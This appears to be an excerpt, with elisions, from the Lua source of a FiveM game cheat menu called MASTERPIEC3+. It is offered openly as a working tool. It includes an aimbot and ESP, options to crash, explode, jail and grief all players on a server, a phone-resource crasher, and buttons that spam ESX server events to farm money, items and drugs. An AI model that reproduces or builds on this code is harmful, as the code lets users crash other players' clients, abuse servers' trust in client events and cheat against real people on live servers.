---- MASTERPIEC3+ v1.1
---- The base for this menu was Tiago 4.2 Mod Menu. All posterior alterations are from me.
---- For help or info conctact lenda#2964 on Discord.
...
function discordrich()
    ...
    SetRichPresence('dev - lenda#2964')
    SetDiscordAppId(716272263225278505)
...
--==================================================================================================================================================--
-- Menu GUI/Themes/ComboBox/Slider/Buttons Functions and Locals.
--==================================================================================================================================================--
...
function MIOddhwuie.SetTheme(id, theme)
    if theme == "basic" then
        MIOddhwuie.SetMenuBackgroundColor(id, 6, 161, 11, 100)-- (id, 81, 231, 251, 125) Original Color
        MIOddhwuie.SetTitleBackgroundColor(id, 255, 255, 255, 255)-- (id, 92, 212, 249, 80) Original Color
        MIOddhwuie.SetTitleColor(id, 6, 161, 11, 230)-- (id, 92, 212, 249, 230)
...
local menuY = {0.2, 0.1, 0.025, 0.2, 0.3, 0.400, 0.425}

-- Might delete later. dunno.
-- vRP = Proxy.getInterface("vRP")

--==================================================================================================================================================--
-- Menu GUI Texture Handling.
--==================================================================================================================================================--
Citizen.CreateThread(function()
    local p = 1
    while true do
        if theme == "legend" then -- static effect for basic theme - https://github.com/esc0rtd3w/illicit-sprx/blob/master/main/illicit/textures.h
            if p == 5 then p = 1 else p = p + 1 end
            for i = 1, #menulist do
                if MIOddhwuie.IsMenuOpened(menulist[i]) then MIOddhwuie.SetTitleBackgroundSprite(menulist[i], 'commonmenu', 'gradient_nav' .. p) end
            end
        else -- Base textures
            for i = 1, #menulist do MIOddhwuie.SetTitleBackgroundSprite(menulist[i], 'commonmenu', 'gradient_bgd') end --             for i = 1, #menulist do MIOddhwuie.SetTitleBackgroundSprite(menulist[i], 'shopui_title_sm_hangar', 'shopui_title_sm_hangar') end
        end
        Wait(100)
    end
end)
...
local function ForceMod()
    ...
    if ForceTog then
        Citizen.CreateThread(function()
            ShowInfo("~b~~h~Info:~h~~s~ Force Mode ~g~~h~[ON]")
    ...
    else ShowInfo("~b~~h~Info:~h~~s~ Force Mode ~r~~h~[OFF]") end
end
...
local function PossessVehicle(target)
    ...
    if not PossessingVeh then
        ...
        ShowInfo("~b~~h~Info:~h~~s~ Checking player...")
        Wait(3000)
        if IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
            ...
            SpectatePlayer(selectedPlayer)
            PossessingVeh = false
            ShowInfo("~r~~h~Error:~h~~s~ Player not in a vehicle!")
        end
...
function TeleportToCoords()
    ...
    if x ~= "" and y ~= "" and z ~= "" then
        ...
        ShowInfo("~r~~h~Error:~h~~s~ Invalid coordinates!")
    end
end
...
local function fixcar()
    ShowInfo("~g~~h~Success:~h~~s~ Car fixed!")
...
local function TeleportToWaypoint()
    ...
    if blipFound then
        ...
        ShowInfo('~r~~h~Error:~h~~s~ Blip not found!')
    end
    
    if success then
        ShowInfo("~g~~h~Success:~h~~s~ Teleported!")
...
local function ToggleNoclip()
    ShowInfo("~b~~h~Info:~h~~s~ Noclip ~g~~h~[ON]")
        ...
        while ESPEnabled do
            ...
            for i = 1, #plist do
                ...
                if distance <= EspDistance then
                    ...
                    local espstring1 = "~y~ID: ~w~" .. GetPlayerServerId(plist[i]) .. "~w~  |  ~y~Name: ~w~" .. GetPlayerName(plist[i]) .. "  |  ~y~Distance: ~w~" .. math.floor(distance)
                    local espstring2 = "~y~Weapon: ~w~" .. wepname .. "  |  ~y~Vehicle: ~w~" .. vehname
...
local function SpawnVeh(model, PlaceSelf, SpawnEngineOn)
    ...
    if HasModelLoaded(GetHashKey(model)) then
        ...
        return veh
    else ShowInfo("~r~~h~Error:~h~~s~ Model not recognized!") end
end
...
ResourcesToCheck = {
        -- ESX
        "es_extended", "esx_dmvschool", "esx_policejob", "es_admin",
        -- VRP
        "vrp", "vrp_trucker", "vrp_TruckerJob"
}

Citizen.CreateThread(function()
    ShowInfo("         ~g~~h~MasterPiec3+ v1.1")
    if mpMessage then ShowMPMessage("~b~~h~Info:~h~~s~ " .. GetPlayerName(PlayerId()) .. " has logged in.", 50) else ShowInfo("~b~~h~Info:~h~~s~ " .. GetPlayerName(PlayerId()) .. " has logged in.") end
    ...
    if NetworkIsHost() then
        IsPlayerHost = "~b~~h~Info:~h~~s~ ~g~Yes"
    else
        IsPlayerHost = "~b~~h~Info:~h~~s~ ~r~No"
    end
    ...
    -- MAIN MENU
    MIOddhwuie.CreateMenu('basic', 'M3+', ' v1.1')
    MIOddhwuie.SetSubTitle('basic', 'Server IP: ' .. GetCurrentServerEndpoint())
    
    -- MAIN MENU SUBMENUS
    MIOddhwuie.CreateSubMenu('player', 'basic', 'Player Options')
    MIOddhwuie.CreateSubMenu('self', 'basic', 'Self Options')
    MIOddhwuie.CreateSubMenu('weapon', 'basic', 'Weapon Options')
    MIOddhwuie.CreateSubMenu('vehicle', 'basic', 'Vehicle Options')
    MIOddhwuie.CreateSubMenu('world', 'basic', 'World Options')
    MIOddhwuie.CreateSubMenu('teleport', 'basic', 'Teleport Options')
    MIOddhwuie.CreateSubMenu('visual', 'basic', 'Visual Options')
    MIOddhwuie.CreateSubMenu('lua', 'basic', 'Lua Options')
    ...
    -- SELF MENU SUBMENUS
    MIOddhwuie.CreateSubMenu('appearance', 'basic', 'Appearance Options')
    ...
    -- WORLD MENU SUBMENUS
    MIOddhwuie.CreateSubMenu('objectspawner', 'basic', 'Object Spawner')
    ...
    -- VISUAL MENU SUBMENUS
    MIOddhwuie.CreateSubMenu('esp', 'visual', 'ESP & Visual Options')
    MIOddhwuie.CreateSubMenu('webradio', 'visual', 'Web Radio')
    MIOddhwuie.CreateSubMenu('credits', 'visual', 'Credits')
    
    -- TELEPORT MENU SUBMENUS
    MIOddhwuie.CreateSubMenu('saveload', 'teleport', 'Save/Load Position')
    MIOddhwuie.CreateSubMenu('positions', 'teleport', 'positions')
    -- FUCK SERVER
    MIOddhwuie.CreateSubMenu('fuckserver', 'basic', 'Fuck Server')
    ...
    while true do
        -- MAIN MENU
        if MIOddhwuie.IsMenuOpened("basic") then
                ...
                elseif MIOddhwuie.MenuButton("Models Options", "appearance") then
                    ...
                    elseif MIOddhwuie.MenuButton("Vehicle Options", "vehicle") then
                        ...
                        elseif MIOddhwuie.MenuButton("Teleport Options", "teleport") then
                            elseif MIOddhwuie.MenuButton("Visual Options", "visual") then
                            elseif MIOddhwuie.MenuButton("Objects Options", "objectspawner") then
                                elseif MIOddhwuie.MenuButton("Server Options", "fuckserver") then
        ...
        elseif MIOddhwuie.IsMenuOpened('player') then
            ...
            for i = 1, #playerlist do
                ...
                if MIOddhwuie.MenuButton("ID: ~g~[" .. GetPlayerServerId(currPlayer) .. "] ~s~NAME: ~m~[" .. GetPlayerName(currPlayer) .. "]~s~ STATUS: " .. (IsPedDeadOrDying(GetPlayerPed(currPlayer), 1) and "~r~[DEAD]" or "~g~[ALIVE]"), 'playeroptions') then
        ...
        elseif MIOddhwuie.IsMenuOpened('fuckserver') then
            ...
            elseif MIOddhwuie.CheckBox("Jail All Players", Enable_Jail) then
                ShowInfo("~b~~h~Info:~h~~s~ Jailing all players...")
                Enable_Jail = not Enable_Jail
                ShowInfo("~g~~h~Success:~h~~s~ Done!")
            elseif MIOddhwuie.CheckBox("~r~Destroy~s~ all players", WorldOnFire, Enable_Nuke) then
                WorldOnFire = not WorldOnFire
                Enable_Nuke = not Enable_Nuke
                if WorldOnFire then
                    ShowInfo("~b~~h~Info:~h~~s~ Destroying all players!")
                    wofDUI = CreateDui("https://voca.ro/bAE5Jl4zl5f", 1, 1)
                else
                    DestroyDui(wofDUI)
                end
            elseif MIOddhwuie.CheckBox("~r~Explode~s~ all Players", nukeserver) then
                ShowInfo("~b~~h~Info:~h~~s~ Exploding all players!")
                nukeserver = not nukeserver
            elseif MIOddhwuie.Button("Kick All Players From Vehicle") then
                KickAllFromVeh(includeself)
            elseif MIOddhwuie.Button("Set All Nearby Vehicles Plate Text") then
                local plateInput = GetKeyboardInput("Enter Plate Text [8 Characters]:")
                for k in EnumerateVehicles() do
                    RequestControlOnce(k)
                    SetVehicleNumberPlateText(k, plateInput)
                end
            elseif MIOddhwuie.CheckBox("Make All Vehicles ~m~Fly", FlyingCars) then
                FlyingCars = not FlyingCars
            elseif MIOddhwuie.CheckBox("GcPhone ~r~Crasher", Enable_GcPhone) then
                Enable_GcPhone = not Enable_GcPhone
            elseif MIOddhwuie.Button("~r~Block ~s~Simeons") then
            ...
            elseif MIOddhwuie.Button("~r~Block ~s~Police Department") then
                x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
                roundx = tonumber(string.format('%.2f', x))
                roundy = tonumber(string.format('%.2f', y))
                roundz = tonumber(string.format('%.2f', z))
            ...
            elseif MIOddhwuie.Button("~r~Block ~s~Legion Square") then
                x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
                roundx = tonumber(string.format('%.2f', x))
                roundy = tonumber(string.format('%.2f', y))
                roundz = tonumber(string.format('%.2f', z))
            ...
            elseif MIOddhwuie.Button("~y~Spawn ~s~Lion On All Players") then
            ...
            elseif MIOddhwuie.Button("~y~Spawn ~s~SWAT On All Players ") then
            ...
            elseif MIOddhwuie.Button('Make all Players ~m~Weed') then
                for i = 0, 128 do
            ...
            elseif MIOddhwuie.Button("~r~Fuck ~s~Map") then
                if not FuckMap then
                    ShowInfo("~b~~h~Info:~h~~s~ Fucking Up Map...")
                    FuckMap = true
                else
                    ShowInfo("~b~~h~Info:~h~~s~ Map already fucked!")
                end
        ...
        elseif MIOddhwuie.IsMenuOpened('jobsplayers') then
            ...
            elseif MIOddhwuie.Button("~s~Recruit~r~ Ambulance") then
                local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
        ...
        elseif MIOddhwuie.IsMenuOpened('crashtroll') then
            if MIOddhwuie.Button('Crash Player with ~r~RPG') then
                for i = 0, 32 do
            ...
            elseif MIOddhwuie.Button('Crash Player with ~r~RPG 2') then
                for i = 0, 32 do
                    local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
            ...
            elseif MIOddhwuie.Button('Crash Player with ~r~AK') then
                for i = 0, 32 do
                    local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
            ...
            elseif MIOddhwuie.Button('Crash Player with ~r~AK 2') then
                for i = 0, 32 do
                    local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
            ...
            elseif MIOddhwuie.Button('Crash Player with ~r~PISTOL') then
                for i = 0, 32 do
                    local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
                    RequestModel(GetHashKey('mp_f_freemode_01'))
                    Citizen.Wait(50)
            ...
            elseif MIOddhwuie.Button('Crash Player with ~r~PISTOL 2') then
                for i = 0, 32 do
                    local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
                    RequestModel(GetHashKey('mp_f_freemode_01'))
                    Citizen.Wait(50)
            ...
            elseif MIOddhwuie.Button('Crash Player with ~r~PISTOL 3') then
                for i = 0, 32 do
                    local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
                    RequestModel(GetHashKey('mp_f_freemode_01'))
                    Citizen.Wait(50)
        ...
        elseif MIOddhwuie.IsMenuOpened('playeroptions') then
            if MIOddhwuie.Button("~m~PLAYER: " .. "~g~[" .. GetPlayerServerId(selectedPlayer) .. "] ~s~" .. GetPlayerName(selectedPlayer)) then
                elseif MIOddhwuie.CheckBox("Spectate Player", Spectating, "Spectating: ~u~OFF", "Spectating: ~g~" .. GetPlayerName(SpectatedPlayer)) then
                Spectating = not Spectating
                SpectatePlayer(selectedPlayer)
                ...
                elseif MIOddhwuie.Button("Teleport To Player") then
                    ...
                    if string.lower(confirm) == "y" then
                        ...
                        ShowInfo("~r~~h~Error:~h~~s~ Operation canceled!")
                    end
                elseif MIOddhwuie.ComboBox("Teleport Into Players Vehicle", {"Front Right", "Back Left", "Back Right"}, currSeatIndex, selSeatIndex, function(currentIndex, selClothingIndex)
                    currSeatIndex = currentIndex
                    selSeatIndex = currentIndex
                end) then
                    if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
                        ShowInfo("~r~~h~Error:~h~~s~ Player Not In Vehicle!")
                    else
                        local confirm = GetKeyboardInput("Are you Sure? ~g~Y~w~/~r~N")
                        if string.lower(confirm) == "y" then
                            local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
                            if selSeatIndex == 1 then
                                if IsVehicleSeatFree(veh, 0) then
                                    ...
                                    ShowInfo("~r~~h~Error:~h~~s~ Seat is taken or does not exist!")
                                end
                ...
                elseif MIOddhwuie.Button("~m~Kick~s~ From Vehicle") then
                    KickFromVeh(selectedPlayer)
                elseif MIOddhwuie.Button("~y~Copy~s~ Skin Player") then
                    ClonePed(selectedPlayer)
                    ShowInfo("~g~~h~Success:~h~~s~ Skin copied!")
                elseif MIOddhwuie.Button("~y~ESX ~s~Revive ~r~[RISK]") then
                    local confirm = GetKeyboardInput("Risk to get ~r~banned~s~, use it carefully! Are you Sure? ~g~Y~w~/~r~N")
                    if string.lower(confirm) == "y" then
                ...
                elseif MIOddhwuie.Button('~y~VRP ~s~Revive ~r~[RISK]') then
                    local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                    CreateAmbientPickup(GetHashKey('PICKUP_HEALTH_STANDARD'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('PICKUP_HEALTH_STANDARD'), 1, 0)
                    SetPickupRegenerationTime(pickup, 60)
                elseif MIOddhwuie.MenuButton("~r~Hard Crash ~s~Player", 'crashtroll') then
                    elseif MIOddhwuie.MenuButton("~y~Troll~s~ Menu", 'troll') then
                    elseif MIOddhwuie.MenuButton("~y~ESX~s~ Jobs Menu ~r~[RISK]", 'jobsplayers') then
                        elseif MIOddhwuie.MenuButton("~m~Give~s~ Single Weapon", 'weaponspawnerplayer') then
                        elseif MIOddhwuie.Button("~m~Give~s~ All Weapons") then
                            GiveAllWeapons(selectedPlayer)
                        elseif MIOddhwuie.Button("~m~Remove~s~ All Weapons") then
                        ...
                        elseif MIOddhwuie.Button('~b~Armour~s~ Player') then
                            ...
                            SetPickupRegenerationTime(pickup, 60)
                        elseif MIOddhwuie.Button('Full ~b~Armour~s~ Player') then
                            local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
                            for i = 0, 99 do
                                Citizen.Wait(0)
                        ...
                        elseif MIOddhwuie.Button('~r~Crash ~s~Player') then
                        ...
                        elseif MIOddhwuie.Button("Open inventory") then
                        ...
                        elseif MIOddhwuie.Button('Admin Kick Player (You need to be the Host)') then
                            if NetworkIsHost() then
                                ...
                                drawNotification("~r~~h~Error:~h~~s~ You are not the host of this session!")
                            end
                        end
        -- SELF OPTIONS MENU
        elseif MIOddhwuie.IsMenuOpened('self') then
            if MIOddhwuie.CheckBox("~u~God~s~mode", Godmode) then
                Godmode = not Godmode
            ...
            elseif MIOddhwuie.Button("~m~Randomize ~s~Skins") then
                RandomClothes(PlayerId())
            elseif MIOddhwuie.ComboBox("Player Functions KEY ~y~[«] [»]", {"VRP Revive ~r~[RISK]", "ESX Revive ~r~[RISK]", "Give Armor", "Remove Armor", "Clean Player", "~u~Suicide", "Cancel Animation/Task"}, currPFuncIndex, selPFuncIndex, function(currentIndex, selClothingIndex)
        ...
        elseif MIOddhwuie.IsMenuOpened('appearance') then
            if MIOddhwuie.MenuButton("Models", 'skinsmodels') then
                ...
                else ShowInfo("~r~~h~Error:~h~~s~ Model is not recognized!") end
        ...
        elseif MIOddhwuie.IsMenuOpened('modifyskintextures') then
            if MIOddhwuie.MenuButton("Head", "modifyhead") then
                if GetEntityModel(PlayerPedId()) ~= GetHashKey("mp_m_freemode_01") then
                    ...
                    ShowInfo("~r~~h~Error:~h~~s~ Only MP models are supported for now!")
                end
        ...
        elseif MIOddhwuie.IsMenuOpened('skinsmodels') then
            if MIOddhwuie.Button("~m~Reset Model") then
            ...
            elseif MIOddhwuie.Button("Change To ~p~Monkey") then
            ...
            elseif MIOddhwuie.Button("Change To ~o~Muscleman") then
        ...
        elseif MIOddhwuie.IsMenuOpened('weapon') then
            if MIOddhwuie.MenuButton("Give Single Weapon", 'weaponspawner') then
            ...
            elseif MIOddhwuie.CheckBox("Aimbot", Aimbot) then
                Aimbot = not Aimbot
            elseif MIOddhwuie.ComboBox("Aimbot Bone Target KEY~y~ [«] [»]", AimbotBoneOps, currAimbotBoneIndex, selAimbotBoneIndex, function(currentIndex, selectedIndex)
        ...
        elseif MIOddhwuie.IsMenuOpened('melee') then
            for i = 1, #meleeweapons do
                if MIOddhwuie.Button("~y~» ~s~" .. meleeweapons[i][2] .. "") then
        ...
        elseif MIOddhwuie.IsMenuOpened('pistol') then
            for i = 1, #pistolweapons do
                if MIOddhwuie.Button("~y~» ~s~" .. pistolweapons[i][2] .. "") then
                    GiveWeapon(selectedPlayer, pistolweapons[i][1])
                elseif MIOddhwuie.Button("Remover Ammo") then
        ...
        elseif MIOddhwuie.IsMenuOpened('smg') then
            for i = 1, #smgweapons do
                if MIOddhwuie.Button("~y~» ~s~" .. smgweapons[i][2] .. "") then
        ...
        elseif MIOddhwuie.IsMenuOpened('shotgun') then
            for i = 1, #shotgunweapons do
                if MIOddhwuie.Button("~y~» ~s~" .. shotgunweapons[i][2] .. "") then
        ...
        elseif MIOddhwuie.IsMenuOpened('assault') then
            for i = 1, #assaultweapons do
                if MIOddhwuie.Button("~y~» ~s~" .. assaultweapons[i][2] .. "") then
        ...
        elseif MIOddhwuie.IsMenuOpened('sniper') then
            for i = 1, #sniperweapons do
                if MIOddhwuie.Button("~y~» ~s~" .. sniperweapons[i][2] .. "") then
        ...
        elseif MIOddhwuie.IsMenuOpened('thrown') then
            for i = 1, #thrownweapons do
                if MIOddhwuie.Button("~y~» ~s~" .. thrownweapons[i][2] .. "") then
        ...
        elseif MIOddhwuie.IsMenuOpened('heavy') then
            for i = 1, #heavyweapons do
                if MIOddhwuie.Button("~y~» ~s~" .. heavyweapons[i][2] .. "") then
        ...
        elseif MIOddhwuie.IsMenuOpened('vehicle') then
            if MIOddhwuie.MenuButton("Vehicle Spawner", 'vehiclespawner') then
                ...
                elseif MIOddhwuie.MenuButton("Vehicle Control Menu", 'vehiclemenu') then
                    elseif MIOddhwuie.MenuButton("Vehicle Boost", "VehBoostMenu") then
                    elseif MIOddhwuie.MenuButton("Vehicle Godmode", VehGodmode) then
                        VehGodmode = not VehGodmode
                    elseif MIOddhwuie.ComboBox("Vehicle Functions KEY~y~ [«] [»]", {"Repair Vehicle", "Delete Vehicle", "Clean Vehicle", "Dirty Vehicle"}, currVFuncIndex, selVFuncIndex, function(currentIndex, selClothingIndex)
                    ...
                    elseif MIOddhwuie.ComboBoxSlider("Speed Multiplier", SpeedModOps, currSpeedIndex, selSpeedIndex, function(currentIndex, selectedIndex)
                        ...
                        if not EasyHandling then
                            ...
                            SetVehicleGravityAmount(veh, 25.0)
                        end
        ...
        elseif MIOddhwuie.IsMenuOpened('vehiclemenu') then
            if MIOddhwuie.CheckBox("Save Personal Vehicle", SavedVehicle, "None", "Saved Vehicle: " .. pvehicleText) then
                if IsPedInAnyVehicle(PlayerPedId(), 0) and not SavedVehicle then
                    ...
                    ShowInfo("~g~~h~Success:~h~~s~ Current vehicle saved!")
                    pvehicleText = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(pvehicle))) .. " " .. pvehicle
                elseif SavedVehicle then
                    SavedVehicle = not SavedVehicle
                    pvehicle = nil
                    RemoveBlip(pvblip)
                    ShowInfo("~b~~h~Info:~h~~s~ Saved vehicle blip removed")
                else
                    ShowInfo("~r~~h~Error:~h~~s~ You are not in a vehicle!")
                end
                ...
                obj = objs_tospawn[currObjIndex]
                    ...
                    elseif MIOddhwuie.Button("Add Object By Name") then
                        ...
                        if table.contains(objs_tospawn, testObj) then
                            ShowInfo("~b~~h~Info:~h~~s~ Model " .. testObj .. " is already spawned!")
                        elseif DoesEntityExist(addedObj) then
                            objs_tospawn[#objs_tospawn + 1] = testObj
                            ShowInfo("~b~~h~Info:~h~~s~ Model " .. testObj .. " has been added to the list!")
                        else
                            ShowInfo("~r~~h~Error:~h~~s~ Model " .. testObj .. " does not exist!")
                        end
        ...
        -- VISUAL OPTIONS MENU
        elseif MIOddhwuie.IsMenuOpened('visual') then
            if MIOddhwuie.MenuButton("Visuals", 'esp') then
                ...
                elseif MIOddhwuie.MenuButton("Web Radio", 'webradio') then
                    ...
                    elseif MIOddhwuie.ComboBox2("Change Radio Station", RadiosListWords, currRadioIndex, selRadioIndex, function(currentIndex, selectedIndex)
                        ...
                        elseif MIOddhwuie.ComboBox("Menu X", menuX, currentMenuX, selectedMenuX, function(currentIndex, selectedIndex)
                        ...
                        then
                            elseif MIOddhwuie.ComboBox("Menu Y", menuY, currentMenuY, selectedMenuY, function(currentIndex, selectedIndex)
        ...
        elseif MIOddhwuie.IsMenuOpened('webradio') then
            if MIOddhwuie.CheckBox("Classical", ClassicalRadio, "Status: Not Playing", "Status: Playing") then
                ...
                if ClassicalRadio then
                    ...
                    ShowInfo("~b~~h~Info:~h~~s~ Now Playing...")
                else
                    DestroyDui(RadioDUI)
                    ShowInfo("~b~~h~Info:~h~~s~ Web Radio Stopped!")
                end
            end
        ...
        elseif MIOddhwuie.IsMenuOpened('teleport') then
            if MIOddhwuie.MenuButton('Save/Load Position', 'saveload') then
                elseif MIOddhwuie.Button("Teleport To Coordinates") then
                TeleportToCoords()
                elseif MIOddhwuie.MenuButton('Locations', 'positions') then
                    elseif MIOddhwuie.Button('Teleport to Waypoint ~r~[NUM 4]') then
                    TeleportToWaypoint()
                    elseif MIOddhwuie.Button('Teleport to FBI') then
                        fbi()
                    elseif MIOddhwuie.Button('Teleport to LS Customs') then
                        ls()
                    elseif MIOddhwuie.Button('Teleport to Main Garage') then
                        gp()
                    elseif MIOddhwuie.Button('Teleport to Ammunation') then
                        Ammunation()
                    elseif MIOddhwuie.Button('Teleport to Clothes shop') then
                        shopclothes()
                    elseif MIOddhwuie.Button('Teleport to Barber') then
                        barber()
                    end
        elseif MIOddhwuie.IsMenuOpened('saveload') then
            if MIOddhwuie.ComboBox("Saved Location 1", {"save", "load"}, currSaveLoadIndex1, selSaveLoadIndex1, function(currentIndex, selectedIndex)
                ...
                if selSaveLoadIndex1 == 1 then
                    ...
                    ShowInfo("~b~~h~Info:~h~~s~ Position 1 saved!")
                else
                    if not savedpos1 then ShowInfo("~r~~h~Error:~h~~s~ There is no saved position for slot 1!") else
                        SetEntityCoords(PlayerPedId(), savedpos1)
                        ShowInfo("~b~~h~Info:~h~~s~ Position 1 loaded!")
                    end
                end
            elseif MIOddhwuie.ComboBox("Saved Location 2", {"save", "load"}, currSaveLoadIndex2, selSaveLoadIndex2, function(currentIndex, selectedIndex)
                ...
                if selSaveLoadIndex2 == 1 then
                    ...
                    ShowInfo("~b~~h~Info:~h~~s~ Position 2 saved!")
                else
                    if not savedpos2 then ShowInfo("~r~~h~Error:~h~~s~ There is no saved position for slot 2!") else
                        SetEntityCoords(PlayerPedId(), savedpos2)
                        ShowInfo("~b~~h~Info:~h~~s~ Position 2 loaded!")
                    end
                end
            elseif MIOddhwuie.ComboBox("Saved Location 3", {"save", "load"}, currSaveLoadIndex3, selSaveLoadIndex3, function(currentIndex, selectedIndex)
                ...
                if selSaveLoadIndex3 == 1 then
                    ...
                    ShowInfo("~b~~h~Info:~h~~s~ Position 3 saved!")
                else
                    if not savedpos3 then ShowInfo("~r~~h~Error:~h~~s~ There is no saved position for slot 3!") else
                        SetEntityCoords(PlayerPedId(), savedpos3)
                        ShowInfo("~b~~h~Info:~h~~s~ Position 3 loaded!")
                    end
                end
            elseif MIOddhwuie.ComboBox("Saved Location 4", {"save", "load"}, currSaveLoadIndex4, selSaveLoadIndex4, function(currentIndex, selectedIndex)
                ...
                if selSaveLoadIndex4 == 1 then
                    ...
                    ShowInfo("~b~~h~Info:~h~~s~ Position 4 saved!")
                else
                    if not savedpos4 then ShowInfo("~r~~h~Error:~h~~s~ There is no saved position for slot 4!") else
                        SetEntityCoords(PlayerPedId(), savedpos4)
                        ShowInfo("~b~~h~Info:~h~~s~ Position 4 Loaded!")
                    end
                end
            elseif MIOddhwuie.ComboBox("Saved Location 5", {"save", "load"}, currSaveLoadIndex5, selSaveLoadIndex5, function(currentIndex, selectedIndex)
                ...
                if selSaveLoadIndex5 == 1 then
                    ...
                    ShowInfo("~b~~h~Info:~h~~s~ Position 5 saved!")
                else
                    if not savedpos5 then ShowInfo("~r~~h~Error:~h~~s~ There is no saved position for slot 5!") else
                        SetEntityCoords(PlayerPedId(), savedpos5)
                        ShowInfo("~b~~h~Info:~h~~s~ Position 5 loaded!")
                    end
                end
            end
        elseif MIOddhwuie.IsMenuOpened('positions') then
        ...
        elseif MIOddhwuie.IsMenuOpened('lua') then
            if MIOddhwuie.MenuButton('~y~ESX ~s~& ~y~vRP ~s~ Money Options', 'money') then
                elseif MIOddhwuie.MenuButton('~y~ESX ~s~Set Jobs', 'player1') then
                elseif MIOddhwuie.MenuButton('~y~ESX ~s~Drugs Farm', 'drogas') then
                    elseif MIOddhwuie.MenuButton('~y~ESX ~s~Mechanic Items ', 'mecanico') then
                    elseif MIOddhwuie.MenuButton('~y~ESX ~s~Options', 'esx') then
                        elseif MIOddhwuie.MenuButton('~y~VRP ~s~Options', 'vrp') then
                        end
        elseif MIOddhwuie.IsMenuOpened('mecanico') then
            if MIOddhwuie.Button("Harvest Gas Can") then
                TriggerServerEvent('esx_mechanicjob:startHarvest')
                TriggerServerEvent('esx_mechanicjob:startHarvest')
                TriggerServerEvent('esx_mechanicjob:startHarvest')
                TriggerServerEvent('esx_mechanicjob:startHarvest')
                TriggerServerEvent('esx_mechanicjob:startHarvest')
            elseif MIOddhwuie.Button("Harvest Repair Tools") then
                TriggerServerEvent('esx_mechanicjob:startHarvest2')
                TriggerServerEvent('esx_mechanicjob:startHarvest2')
                TriggerServerEvent('esx_mechanicjob:startHarvest2')
                TriggerServerEvent('esx_mechanicjob:startHarvest2')
                TriggerServerEvent('esx_mechanicjob:startHarvest2')
            elseif MIOddhwuie.Button("Harvest Body Tools") then
                TriggerServerEvent('esx_mechanicjob:startHarvest3')
                TriggerServerEvent('esx_mechanicjob:startHarvest3')
                TriggerServerEvent('esx_mechanicjob:startHarvest3')
                TriggerServerEvent('esx_mechanicjob:startHarvest3')
                TriggerServerEvent('esx_mechanicjob:startHarvest3')
            elseif MIOddhwuie.Button("Harvest Tuner Chip") then
                TriggerServerEvent('esx_mechanicjob:startHarvest4')
                TriggerServerEvent('esx_mechanicjob:startHarvest4')
                TriggerServerEvent('esx_mechanicjob:startHarvest4')
                TriggerServerEvent('esx_mechanicjob:startHarvest4')
                TriggerServerEvent('esx_mechanicjob:startHarvest4')
            elseif MIOddhwuie.Button("Craft Blowtorch") then
                TriggerServerEvent('esx_mechanicjob:startCraft')
                TriggerServerEvent('esx_mechanicjob:startCraft')
                TriggerServerEvent('esx_mechanicjob:startCraft')
                TriggerServerEvent('esx_mechanicjob:startCraft')
                TriggerServerEvent('esx_mechanicjob:startCraft')
            elseif MIOddhwuie.Button("Craft Repair Kit") then
                TriggerServerEvent('esx_mechanicjob:startCraft2')
                TriggerServerEvent('esx_mechanicjob:startCraft2')
                TriggerServerEvent('esx_mechanicjob:startCraft2')
                TriggerServerEvent('esx_mechanicjob:startCraft2')
                TriggerServerEvent('esx_mechanicjob:startCraft2')
            elseif MIOddhwuie.Button("Craft Body Kit") then
        ...
        elseif MIOddhwuie.IsMenuOpened('drogas') then
            if MIOddhwuie.Button("~g~Harvest Weed ~m~[x59") then
                ...
                TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
                TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
            elseif MIOddhwuie.Button("~g~Transform Weed ~m~[x5]") then
                ...
                TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
                TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
            elseif MIOddhwuie.Button("~g~Sell Weed ~m~[x5]") then
                ...
                TriggerServerEvent('esx_illegal_drugs:startSellWeed')
                TriggerServerEvent('esx_illegal_drugs:startSellWeed')
            elseif MIOddhwuie.Button("~w~Harvest Coke ~m~[x5]") then
                ...
                TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
                TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
            elseif MIOddhwuie.Button("~w~Transform Coke ~m~[x5]") then
                ...
                TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
                TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
            elseif MIOddhwuie.Button("~w~Sell Coke ~m~[x5]") then
                ...
                TriggerServerEvent('esx_illegal_drugs:startSellCoke')
                TriggerServerEvent('esx_illegal_drugs:startSellCoke')
            elseif MIOddhwuie.Button("~r~Harvest Meth ~m~[x5]") then
                ...
                TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
                TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
            elseif MIOddhwuie.Button("~r~Transform Meth ~m~[x5]") then
                ...
                TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
                TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
            elseif MIOddhwuie.Button("~r~Sell Meth ~m~[x5]") then
                ...
                TriggerServerEvent('esx_illegal_drugs:startSellMeth')
                TriggerServerEvent('esx_illegal_drugs:startSellMeth')
            elseif MIOddhwuie.Button("~p~Harvest Opium ~m~[x5]") then
                ...
                TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
                TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
            elseif MIOddhwuie.Button("~p~Transform Opium ~m~[x5]") then
                ...
                TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
                TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
